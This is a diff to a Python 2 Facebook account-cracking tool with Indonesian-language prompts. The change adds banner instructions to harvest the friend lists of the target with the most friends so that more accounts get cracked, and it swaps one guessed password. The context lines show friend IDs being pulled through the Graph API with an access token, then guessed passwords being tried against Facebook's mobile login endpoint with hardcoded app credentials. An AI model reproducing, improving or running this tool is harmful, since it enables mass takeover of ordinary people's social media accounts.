@@ -53,6 +53,11 @@ def jalan(z):
 logo = """
 \033[1;92mZero & ZxXx-Angel
 \033[1;91mFollow @zero_xvip
+\033[1;91m
+\033[1;91m  (Pilih Tools NO2/Hack FB Teman Dari Teman)
+\033[1;91m   (Kemudian Ambil ID FB Siapapun Yang Memiliki Teman Paling Banyak)
+\033[1;91m     (Agar Kemungkinan MendapatKan Akun Semakin Besar)
+\033[1;91m
 \033[1;94m▐▓█▀▀▀▀▀▀▀▀▀█▓▌░▄▄▄▄▄░
 \033[1;94m▐▓█░░▀░░▀▄░░█▓▌░█▄▄▄█░
 \033[1;94m▐▓█░░▄░░▄▀░░█▓▌░█▄▄▄█░
@@ -270,7 +275,7 @@ def super():
 	os.system('clear')
 	print logo
 	print "          \x1b[1;33;40m [1] \033[1;33;40m     ID From A Friend"
-	print "          \x1b[1;33;40m [2] \033[1;33;40m     Friend Id Of A Friend"
+	print "          \x1b[1;33;40m [2] \033[1;33;40m     Friend Id Of A Friend (DISARANKAN)"
 	print "          \x1b[1;33;40m [3] \033[1;33;40m     Target ID"
 	print "          \x1b[1;33;40m [4] \033[1;33;40m     Id Of File"
 	print "          \x1b[1;33;40m [0] \033[1;33;40m     Back"
@@ -294,7 +299,7 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		idt = raw_input("          \033[1;96m[*] Enter ID : ")
+		idt = raw_input("          \033[1;96m[*] Enter ID (FB Siapapun Yang Memiliki Teman Paling Banyak): ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -303,7 +308,7 @@ def pilih_super():
 			print"\x1b[1;92m[✺] ID ni lbhi!"
 			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
 			super()
-		print"          \033[1;35;40m[✺]Orang Sabar DiSayang Zanda..."
+		print"          \033[1;35;40m[✺] Orang Sabar DiSayang Allah SWT..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -407,7 +412,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = 'iloveyou'
+											pass5 = 'Anjing'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
